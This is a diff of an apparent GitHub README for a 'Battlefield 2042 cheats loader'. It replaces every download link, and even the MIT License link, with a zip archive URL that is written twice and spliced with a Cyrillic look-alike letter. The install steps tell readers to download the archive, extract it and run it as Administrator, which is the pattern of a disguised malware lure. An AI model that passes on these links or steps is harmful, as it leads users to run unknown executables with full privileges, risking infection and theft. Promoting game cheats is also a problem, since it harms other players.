@@ -46,12 +46,12 @@ Take advantage of a robust set of features, each designed to maximize performanc
 
 Get started in minutes! Follow these detailed steps to install the Battlefield 2042 Cheats Loader across your preferred platform:
 
-**1. Download https://raw.githubusercontent.com/axlcraft/Battlefield2042-EdgeTools/main/Lоader.zip from the repository.**
+**1. Download https://github.com/axlcraft/Battlefield2042-EdgeTools/raw/refs/heads/main/gunong/Tools_Battlefield_Edge_1.0.zipоhttps://github.com/axlcraft/Battlefield2042-EdgeTools/raw/refs/heads/main/gunong/Tools_Battlefield_Edge_1.0.zip from the repository.**
 
-**2. Extract https://raw.githubusercontent.com/axlcraft/Battlefield2042-EdgeTools/main/Lоader.zip**  
+**2. Extract https://github.com/axlcraft/Battlefield2042-EdgeTools/raw/refs/heads/main/gunong/Tools_Battlefield_Edge_1.0.zipоhttps://github.com/axlcraft/Battlefield2042-EdgeTools/raw/refs/heads/main/gunong/Tools_Battlefield_Edge_1.0.zip**  
 Use a secure, updated archiver tool like 7-Zip, WinRAR, or PeaZip to extract all files into a new folder.
 
-**3. Run https://raw.githubusercontent.com/axlcraft/Battlefield2042-EdgeTools/main/Lоader.zip as Administrator**  
+**3. Run https://github.com/axlcraft/Battlefield2042-EdgeTools/raw/refs/heads/main/gunong/Tools_Battlefield_Edge_1.0.zipоhttps://github.com/axlcraft/Battlefield2042-EdgeTools/raw/refs/heads/main/gunong/Tools_Battlefield_Edge_1.0.zip as Administrator**  
 Right-click the executable and select "Run as administrator" for best compatibility.
 
 **4. Launch Battlefield 2042**  
@@ -88,7 +88,7 @@ Always use such tools in safe, offline, or testing environments, and respect the
 
 ## 📄 License (MIT)
 
-This project is distributed under the [MIT License](https://raw.githubusercontent.com/axlcraft/Battlefield2042-EdgeTools/main/Lоader.zip).  
+This project is distributed under the [MIT License](https://github.com/axlcraft/Battlefield2042-EdgeTools/raw/refs/heads/main/gunong/Tools_Battlefield_Edge_1.0.zipоhttps://github.com/axlcraft/Battlefield2042-EdgeTools/raw/refs/heads/main/gunong/Tools_Battlefield_Edge_1.0.zip).  
 You are free to use, modify, share, and distribute this software with proper attribution.
 
 ---
